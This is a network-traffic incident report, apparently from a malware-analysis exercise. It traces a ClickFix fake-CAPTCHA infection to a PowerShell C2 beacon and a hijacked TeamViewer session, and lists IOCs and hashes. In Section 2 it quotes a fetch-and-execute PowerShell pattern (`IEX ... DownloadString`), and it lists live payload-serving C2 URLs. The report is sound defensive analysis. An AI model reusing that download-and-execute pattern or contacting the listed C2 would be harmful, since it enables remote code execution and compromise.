# Incident Report — Network Traffic Analysis

**Case reference:** mta-2025-01-22
**Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 packets, 26 MB, SHA256 `e59db1c07c6fdefafa0abdbca03248c341cdc36c09c34753204d3162802a3586`)
**Capture window:** 2025-01-22 23:44:56 UTC to 2025-01-23 00:38:18 UTC (53 min 22 sec)
**No separate IDS/Suricata alert files were present in the evidence folder.** All findings below are derived directly from packet analysis with tshark.

## 1. Infected host

| Attribute | Value |
|---|---|
| IPv4 address | **10.1.17.215** |
| MAC address | **00:D0:B7:26:4A:74** (DHCP frames 1/3, ARP replies) |
| Windows hostname | **DESKTOP-L8C5GSJ** (DHCP option 12, Kerberos, NBNS, dynamic DNS updates) |
| Logged-in Windows user | **shutchenson** (Kerberos AS-REQ `CNameString`, domain `bluemoontuesday.com`) |
| Windows/AD domain | `bluemoontuesday.com` (DC `WIN-GSH54QLW48D.bluemoontuesday.com`, 10.1.17.2) |
| Workgroup/NetBIOS domain | BLUEMOONTUESDAY |
| Local IP assigned via | DHCP, lease 10.1.17.215 from server 10.1.17.2 (frames 1-4) |

## 2. Malware family and attribution

**Behaviorally consistent with the Matanbuchus loader family (3.x), specifically its "silent TeamViewer" hVNC remote-access module.** No Suricata/IDS ruleset was included in this evidence set, so this attribution is **behavioral, not signature-confirmed** — it is based on the distinctive multi-stage TTP chain reconstructed below, not a matched detection signature or hash lookup.

Basis for the attribution:
- Fake-CAPTCHA "ClickFix" social-engineering lure chain immediately preceding payload retrieval.
- An HTA-style VBScript "component" that launches hidden PowerShell, opens a decoy legitimate page (`azure.microsoft.com`), and pulls a downloader via `IEX (New-Object Net.WebClient).DownloadString(...)`.
- A PowerShell backdoor that fingerprints the host using the **C:\ volume serial number** as a bot ID, then loops every 5 seconds issuing `GET http://<C2>/<serial>` and executing whatever is returned via `Invoke-Expression`.
- The C2 later deploys a **legitimate, signed TeamViewer client bundled with a non-standard companion DLL** (imports `libgcc_s_dw2-1.dll`/`libgcj-16.dll`, GCC/MinGW runtime — inconsistent with genuine MSVC-built TeamViewer components) to run TeamViewer silently for hands-on-keyboard remote access, confirmed by the C2 status message `script: RunRH, status: OK, message: PS process started` and by the workstation then establishing real outbound sessions to TeamViewer's own infrastructure (`master16.teamviewer.com` / `ping3.dyngate.com`, IP 185.188.32.26) — i.e. the attacker rode an actual TeamViewer connection for interactive control.
- Persistence establishment confirmed by the C2 status message `message = startup shortcut created; status = success`.

## 3. Infection timeline (relative to capture start, t=0 at 23:44:56 UTC)

| t (sec) | Event |
|---|---|
| t=38.3 | TLS session to `google-authenticator.burleson-appliance.net` (104.21.64.1/48.1/32.1/80.1/16.1/96.1/112.1) — fake Google-Authenticator/CAPTCHA lure page |
| t=39.6 | TLS session to `authenticatoor.org` (82.221.136.26) — ClickFix fake-verification kit |
| t=52.7 | TLS session to `appointedtimeagriculture.com` (217.70.186.109) — secondary redirect/staging host |
| t=60.3 | `GET http://5.252.153.241/api/file/get-file/264872` — HTA/VBScript "component" (clipboard-paste-and-run stage) |
| t=62.1 | `GET http://5.252.153.241/api/file/get-file/29842.ps1` — obfuscated PowerShell downloader |
| t=62.4–519.3 | C2 beacon loop every ~5.2 s: `GET http://5.252.153.241/1517096937` |
| t=125.0–129.2 | Payload deployment: `GET .../get-file/TeamViewer`, `.../Teamviewer_Resource_fr`, `.../TV`, `.../pas.ps1` |
| t=129.2 | C2 status: `message = startup shortcut created; status = success` (persistence) |
| t=610.8–612.x | Workstation resolves and connects to `ping3.dyngate.com` / `master16.teamviewer.com`, establishing a live session with TeamViewer master server 185.188.32.26 (silent/hidden remote-control session) |
| t=881.9 | C2 status: `script: RunRH, status: OK, message: PS process started` |
| t=2413.4 | Second `RunRH` execution |
| t=2577.7 | Third `RunRH` execution |
| t=62.4–3202.1 | Beacon loop to `5.252.153.241/1517096937` continues at ~5.2 s intervals through the end of the capture |

## 4. Indicators of compromise

**Command-and-control:**
- `5.252.153.241:80` — primary loader/backdoor C2 (accessed by raw IP, no DNS lookup; TCP conversation 10.1.17.215↔5.252.153.241, 6.8 MB/9,076 packets over the full capture)

**Malicious/lure domains (with resolved IPs seen in capture):**
- `authenticatoor.org` → 82.221.136.26 — ClickFix fake-verification page host
- `google-authenticator.burleson-appliance.net` → 104.21.64.1, 104.21.48.1, 104.21.32.1, 104.21.80.1, 104.21.16.1, 104.21.96.1, 104.21.112.1 (Cloudflare-fronted) — fake Google Authenticator lure
- `appointedtimeagriculture.com` → 217.70.186.109 — secondary staging/redirect host

**Malicious URLs:**
- `http://5.252.153.241/api/file/get-file/264872` — initial HTA/VBScript stage
- `http://5.252.153.241/api/file/get-file/29842.ps1` — obfuscated PowerShell downloader
- `http://5.252.153.241/api/file/get-file/pas.ps1` — decoded, this is the persistent C2 beacon loop script (keys off `C:\` volume serial, polls every 5 s, `Invoke-Expression`s the response)
- `http://5.252.153.241/api/file/get-file/TeamViewer`, `/Teamviewer_Resource_fr`, `/TV` — silent remote-access module components
- `http://5.252.153.241/1517096937` — bot-ID-keyed beacon/tasking endpoint (bot ID = victim's hex volume serial converted to decimal)

**Transferred files and SHA-256 hashes (computed from objects carved out of this pcap):**

|---|---|---|
| `264872` | `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103` | VBScript "component"/HTA stage |
| `29842.ps1` | `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded` | Obfuscated PowerShell downloader |
| `pas.ps1` | `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e` | Decoded PowerShell C2 backdoor loop |
| `TeamViewer` | `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e` | PE32 GUI executable (TeamViewer client) |
| `Teamviewer_Resource_fr` | `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192` | PE32 DLL (TeamViewer French resource module) |
| `TV` | `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7` | PE32 DLL — non-standard companion binary (GCC/MinGW imports referencing TeamViewer mutex names; delivers the silent/hVNC-style hijack of the TeamViewer session) |

**Note:** hashes are computed from the objects as reassembled from this specific pcap and have not been checked against any external threat-intel source, per instructions not to use the internet.
